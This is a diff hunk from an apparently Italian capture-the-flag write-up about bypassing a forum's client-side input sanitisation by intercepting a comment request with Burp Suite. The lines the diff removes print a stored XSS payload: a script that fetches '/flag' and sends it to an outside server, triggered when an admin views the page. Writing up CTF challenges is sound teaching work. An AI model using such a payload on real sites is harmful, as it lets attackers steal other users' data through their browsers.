@@ -32,12 +32,6 @@ Questo significa che, sebbene il form sul browser sanitizzi perfettamente l'inpu
 1. Registra un account sul forum
 2. Configura Burp Suite (o un altro proxy) per intercettare le richieste
 3. Scrivi un commento e invialo mentre intercetti la richiesta
-4. Modifica il campo 'content' nella richiesta con un payload XSS, ad esempio: (sostituisci `https://myserver.com` con il tuo server per ricevere la flag, beeceptor è un'opzione veloce per testare)
-   ```html
-   <script>fetch('/flag').then(r=>r.text()).then(t=>fetch('https://myserver.com?f='+encodeURIComponent(t)))</script>
-   ``` (naturalmente va codificato il tutto in URL)
-5. Invia la richiesta modificata
-6. Quando l'admin visita la pagina, il tuo script verrà eseguito e la flag verrà inviata al tuo server
 
 ## Cosa Imparare
 Questa challenge dimostra:
